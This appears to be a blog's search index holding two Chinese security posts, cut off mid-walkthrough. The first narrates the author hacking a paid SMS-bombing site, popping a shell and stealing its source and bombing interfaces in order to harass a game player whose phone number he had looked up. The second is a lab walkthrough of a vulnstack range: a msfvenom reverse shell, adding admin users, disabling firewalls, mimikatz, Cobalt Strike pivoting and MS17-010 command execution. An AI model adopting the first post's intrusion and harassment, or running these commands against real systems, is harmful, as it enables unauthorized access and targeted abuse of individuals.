<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>一次寻找接口的惨痛经历</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86.html</url>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。</p><p>可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。</p><p>翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。</p><a id="more"></a><h2 id="故事开始"><a href="#故事开始" class="headerlink" title="故事开始"></a>故事开始</h2><p>很快就找到了目标站，这里就不上图了，幸运的发现有死抓死吐的洞，就这样，三分钟弹了个shell到自己服务器上。</p><p>开始疯狂在对方服务器上找数据库，起初以为接口保存在裤子里，但是翻了半天，并没有找到。</p><p>不管三七二十一，把源码和裤子打包到本地慢慢找。</p><h2 id="误导"><a href="#误导" class="headerlink" title="误导"></a>误导</h2><p>在phone目录的main.jsp中发现这样一长串的js代码，肯定是做了处理。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/01.png" alt="一次寻找接口的惨痛经历"></p><p>不过这种加密方式以前好像看别人说过怎么解，复制到一个新的html文件，使用alert。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/02.png" alt="一次寻找接口的惨痛经历"></p><p>就这样得到了加密前的源码，可以看出是ajax发包的，于是自己当时十分确定接口就在这些js中。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/03.png" alt="一次寻找接口的惨痛经历"></p><p>切换回client目录的main.jsp文件，确实发现了加密的代码，不过使用的是sojson.v5加密，变量名都被替换了，应该是不能完全解密，在网上也看了一些文章，并没有发现什么详细的解密过程。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/04.png" alt="一次寻找接口的惨痛经历"></p><p>就这样，没有头绪了，眼看接口在眼前却解不开。</p><h2 id="误导-1"><a href="#误导-1" class="headerlink" title="误导"></a>误导</h2><p>继续翻了翻其他目录，发现old目录下存在main.jsp，对比了下确定是同一个文件，但是这个并没有加密，激动得蹦了起来。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/05.png" alt="一次寻找接口的惨痛经历"></p><p>But，从上翻到下，并未发现接口的任何信息，只有一个url，而且提供了帐号密码，从提供的这些信息来看，感觉是调用了远程的接口。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/06.png" alt="一次寻找接口的惨痛经历"></p><p>然后我就用提供的这些参数一顿操作，发现无论如何，都是跳转到BC的站，莫非是引流的。</p><p>开始郁闷了，掏出自己03的虚拟机，把源码在本地搭建了起来，是可以正常运行的，而且火力还挺猛。</p><p>利用fd抓包，可以抓到接口的信息，心里暗自高兴，写了个脚本把抓到的信息处理了一下，加到自己的裤子中，结果就收到三四条短信。。。</p><h2 id="继续懵逼"><a href="#继续懵逼" class="headerlink" title="继续懵逼"></a>继续懵逼</h2><p>很无奈，决定从头仔细看一遍代码，对调用的函数都跟踪了一下，找到了关键的代码位置。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/07.png" alt="一次寻找接口的惨痛经历"></p><p>抓包发现请求包和响应包都是加密的，在虚拟机自己改代码进行调试，将modelUrls和params输出，然后成功显示出来了。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/08.png" alt="一次寻找接口的惨痛经历"></p><p>继续写脚本处理数据，本以为事情到此结束，可是收到的又是不到10条短信。。。</p><h2 id="悔恨"><a href="#悔恨" class="headerlink" title="悔恨"></a>悔恨</h2><p>此时真的不知道接口位置了，只能继续往前推，找到请求的url，“callPhone!callNumberPhone.action”，但是自己对这玩意也不懂呀，不知道代码位置在哪，于是一个目录一个目录的翻，吃了ide的亏，一开始翻的时候ide中并没有显示这些class文件。不然也不会走这么多弯路了。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/09.png" alt="一次寻找接口的惨痛经历"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>找到了class文件，就进行了反编译，就这样，所有的接口都到手了。</p><p><img src="/images/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/10.png" alt="一次寻找接口的惨痛经历"></p><p>处理后在本地测试，是自己想要的结果。抽了自己两掌，事情结束。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>短信轰炸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ATT&amp;CK实战系列——红队实战（一）</title>
    <link href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%C2%96ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.html"/>
    <url>/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%C2%96ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    
    <content type="html"><![CDATA[<p>关于内网渗透的学习资源太少了，自己也在恶补这块的知识，文章是看前辈们的文章结合自己的实际操作写的，就当作是笔记吧</p><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><h3 id="1-1环境搭建测试"><a href="#1-1环境搭建测试" class="headerlink" title="1.1环境搭建测试"></a>1.1环境搭建测试</h3><p>最近想要开始学习内网渗透，搜集了一些教程，准备先实验一个vulnstack靶机，熟悉一下内网渗透操作再学习基础知识。</p><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>压缩包中的win7为VM1，win2003为VM2，win2008为VM3，拓扑图如下所示：</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/01.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><a id="more"></a><p>win7网络适配器1设置成自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式，</p><p>win2003、win2008 网络适配器设置成自定义（VMnet1仅主机模式）。</p><p>主机默认开机密码都是hongrisec@2019，手动在win7的c盘下开启phpstudy。</p><p>设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。</p><p>攻击机：kali ip: 192.168.66.130 / 物理机 ip: 192.168.1.101 / CS server IP : 192.168.66.129</p><p>win7 内网ip: 192.168.52.143  外网ip: 192.168.66.128</p><p>win2003 ip: 192.168.52.141</p><p>win2008 ip: 192.168.52.138</p><h3 id="1-2信息收集"><a href="#1-2信息收集" class="headerlink" title="1.2信息收集"></a>1.2信息收集</h3><p> nmap扫一下可以看到win7开放了80端口，访问一下得知是是phpstudy搭建，尝试利用phpstudy后门拿shell，利用失败。开启phpstudy时看了下目录，有yxcms，百度下关于yxcms的漏洞，都是需要后台才可以getshell的。这里也可以通过phpmyadmin来getshell。</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/02.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h2 id="二、漏洞利用（两种getshell方式）"><a href="#二、漏洞利用（两种getshell方式）" class="headerlink" title="二、漏洞利用（两种getshell方式）"></a>二、漏洞利用（两种getshell方式）</h2><h3 id="2-1yxcms后台getshell"><a href="#2-1yxcms后台getshell" class="headerlink" title="2.1yxcms后台getshell"></a>2.1yxcms后台getshell</h3><p>打开默认后台 <a href="http://192.168.66.128/yxcms/index.php?r=admin/index/login">http://192.168.66.128/yxcms/index.php?r=admin/index/login</a> 利用burp爆破，admin 123456 登进后台。</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/03.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>在前台模板-&gt;管理模板文件-&gt;index_index.php处编辑，插入一句话木马</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/04.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>shell地址为：<a href="http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php">http://192.168.66.128/yxcms/protected/apps/default/view/default/index_index.php</a></p><p>蚁剑连接即可获得shell（蚁剑不用代理）</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/05.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="2-2phpmyadmin后台getshell"><a href="#2-2phpmyadmin后台getshell" class="headerlink" title="2.2phpmyadmin后台getshell"></a>2.2phpmyadmin后台getshell</h3><p> 此处过程略过，感兴趣小伙伴可以自己尝试。</p><h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="3-1尝试远程登录"><a href="#3-1尝试远程登录" class="headerlink" title="3.1尝试远程登录"></a>3.1尝试远程登录</h3><p> 查看当前用户权限，因为一般拿下window的话都会尝试去连接它的远程桌面，所以再查看一下3389端口开放情况</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/06.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>没有回显，即3389并没有开启或者默认端口被改。</p><p>使用<code>tasklist /svc</code>命令查看服务中存在<code>TermService</code>的PID号，未发现该服务，确定3389端口未开启。</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/07.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>我们使用以下命令开启它（win7、win2003、winxp），运行后显示3389端口已经成功开启（关闭命令把如下0都换成1），当然还有其他开3389的方法，随便用哪种：</p><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f</code></pre><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/08.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>由于权限较高，直接使用cmd命令 添加用户</p><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> Aa123456 /add <span class="hljs-comment"># 添加账户密码</span>net localgroup administrators ice /add <span class="hljs-comment"># 给ice账户添加为管理员权限</span>net <span class="hljs-keyword">user</span> <span class="hljs-title">ice</span> <span class="hljs-comment"># 查询是否成功添加ice用户</span></code></pre><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/09.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用账号：ice，密码：Aa123456 登录远程桌面。但是登陆失败，nmap扫描3389端口发现状态为filtered。查看win7，防火墙开启了阻止所有与未在允许程序列表中的程序的连接，换句话说，设置了白名单，只能本地连接。</p><p>由于这里权限较高，我们可以直接在shell中使用<code>netsh advfirewall set allprofiles state off</code>命令关闭防火墙</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/10.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>关闭防火墙后利用远程桌面连接服务器即可</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/11.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-2msf反弹shell"><a href="#3-2msf反弹shell" class="headerlink" title="3.2msf反弹shell"></a>3.2msf反弹shell</h3><p>使用msf反弹一个shell。msf生成shell.exe，用蚁剑上传至win7，再在msf设置监听，在蚁剑上执行shell.exe，可以看到msf成功获得一个meterpreter</p><pre><code class="hljs routeros">15:57 root@iceH:~ <span class="hljs-variable">$msfvenom</span> -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.66.130 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; shell.exe<span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> Arch selected, selecting Arch: x86 <span class="hljs-keyword">from</span> the payload<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payloadPayload size: 341 bytesFinal size of exe file: 73802 bytes</code></pre><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/12.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="3-3mimikatz获取账号密码"><a href="#3-3mimikatz获取账号密码" class="headerlink" title="3.3mimikatz获取账号密码"></a>3.3mimikatz获取账号密码</h3><p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p><pre><code class="hljs arduino">migrate PIDload mimikatzmimikatz_command -f sekurlsa::searchPasswords</code></pre><p>ps命令查看进程ID，一般选择explorer.exe对应的PID，但是这里它不是system权限，选择注入其他合法进程。</p><p>这一步中我没有成功读出密码 。</p><h3 id="3-4派生CobaltStrike权限"><a href="#3-4派生CobaltStrike权限" class="headerlink" title="3.4派生CobaltStrike权限"></a>3.4派生CobaltStrike权限</h3><p>先在CS上设置监听</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/13.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p> 拥有msf shell的攻击机与搭建cobaltstrike的服务端不需要是同一台主机，端口相通即可实现远程派生shell</p><pre><code class="hljs sql"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/payload_inject<span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http<span class="hljs-keyword">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span><span class="hljs-keyword">set</span> lhost xxxx                   <span class="hljs-comment">#cobaltstrike监听的ip</span><span class="hljs-keyword">set</span> lport <span class="hljs-number">14444</span>                  <span class="hljs-comment">#cobaltstrike监听的端口 </span><span class="hljs-keyword">set</span> <span class="hljs-keyword">session</span> <span class="hljs-number">1</span>                    <span class="hljs-comment">#这里是当前获得的session的id</span>exploit</code></pre><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/14.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>可以看到cs成功接收到shell</p><h3 id="3-5域信息收集"><a href="#3-5域信息收集" class="headerlink" title="3.5域信息收集"></a>3.5域信息收集</h3><p>渗透测试的本质是信息收集，先记录一些常用命令</p><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span>net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>ipconfig <span class="hljs-string">/all</span> 　　　　　  <span class="hljs-comment">#查询本机IP段，所在域等 </span>net config Workstation  <span class="hljs-comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span>net user 　　　　　　　   <span class="hljs-comment">#本机用户列表</span>net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>   <span class="hljs-comment">#查看域内所有的主机名 </span>net group <span class="hljs-string">&quot;domain admins&quot;</span> <span class="hljs-string">/domain</span>      <span class="hljs-comment">#查看域管理员 </span>net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span> <span class="hljs-comment">#查看域控</span>net localhroup administrators          <span class="hljs-comment">#本机管理员[通常含有域用户]</span>net user 用户名 <span class="hljs-string">/domain</span>                 <span class="hljs-comment">#获取指定用户的账户信息  </span>net group <span class="hljs-string">/domain</span>                      <span class="hljs-comment">#查询域里面的工作组 </span>net group 组名 <span class="hljs-string">/domain</span>                  <span class="hljs-comment">#查询域中的某工作组</span></code></pre><p>ipconfig /all看到有内网ip，有域</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/15.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域列表</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/16.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询同域机器</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/17.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>判断主域</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/18.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>查询域用户</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/19.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>显示当前域中的计算机列表</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/20.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>整理一下信息</p><p>域：god.org</p><p>域内有三个用户：Administrator、ligang、liukaifeng01</p><p>域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA</p><p>域控：OWA(192.168.52.138)</p><p> win7内网ip：192.168.52.143</p><h2 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h2><h3 id="4-1添加路由、挂Socks4a代理"><a href="#4-1添加路由、挂Socks4a代理" class="headerlink" title="4.1添加路由、挂Socks4a代理"></a>4.1添加路由、挂Socks4a代理</h3><p>添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递</p><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p><p>（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</p><p> 添加内网路由</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/21.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>arp -a查看一下所有接口的当前 ARP 缓存表</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/22.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>设置代理，设置成功后打开其他程序需前加上proxychains</p><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">use</span> auxiliary/<span class="hljs-keyword">server</span>/socks4amsf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">show</span> options<span class="hljs-keyword">Module</span> options (auxiliary/<span class="hljs-keyword">server</span>/socks4a):   <span class="hljs-keyword">Name</span>     <span class="hljs-keyword">Current</span> Setting  <span class="hljs-keyword">Required</span>  Description   <span class="hljs-comment">----     ---------------  --------  -----------</span>   SRVHOST  <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>          yes       The address <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>   SRVPORT  <span class="hljs-number">1080</span>             yes       The port <span class="hljs-keyword">to</span> listen on.Auxiliary <span class="hljs-keyword">action</span>:   <span class="hljs-keyword">Name</span>   Description   <span class="hljs-comment">----   -----------</span>   Proxy  msf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run[*] Auxiliary <span class="hljs-keyword">module</span> running <span class="hljs-keyword">as</span> background job <span class="hljs-number">0.</span>[*] <span class="hljs-keyword">Starting</span> the socks4a proxy <span class="hljs-keyword">server</span></code></pre><p>然后打开/etc/proxychains.conf（原始端口是9050，改为我们设置的1080）</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/23.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>测试一下可以成功访问192.168.52.0网段</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/24.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-2拿下第二台主机"><a href="#4-2拿下第二台主机" class="headerlink" title="4.2拿下第二台主机"></a>4.2拿下第二台主机</h3><p>扫描一下VM2（192.168.52.141）proxychains nmap -p 1-1000 -Pn -sT 192.168.52.141</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/25.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开放了445端口，所以利用<code> use auxiliary/scanner/smb/smb_version</code> 可以扫描系统版本，扫描结果是<code>win2003</code></p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/26.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用<code>ms08-067</code>打一下，发现打不了</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/27.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开始尝试<code>ms17-010</code>，使用<code>auxiliary/scanner/smb/smb_ms17_010</code>对52这个段进行扫描，发现三台主机都存在漏洞</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/28.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>利用<code>exploit/windows/smb/ms17_010_psexec</code>对<code>192.168.52.141</code>进行攻击，发现没办法弹回shell。</p><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/29.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>发现可以使用<code>auxiliary/admin/smb/ms17_010_command</code>来执行一些命令且是系统权限。</p><pre><code class="hljs shell">use auxiliary/admin/smb/ms17_010_commandshow optionsset rhosts 192.168.52.141set command &quot;net user ice Aa123456 /add&quot; #添加用户exploit #成功执行</code></pre><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/30.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &quot;net localgroup administrators ice /add&quot; #管理员权限exploit #成功执行</code></pre><p><img src="/images/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/31.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;exploit #成功执行</code></pre><p><img 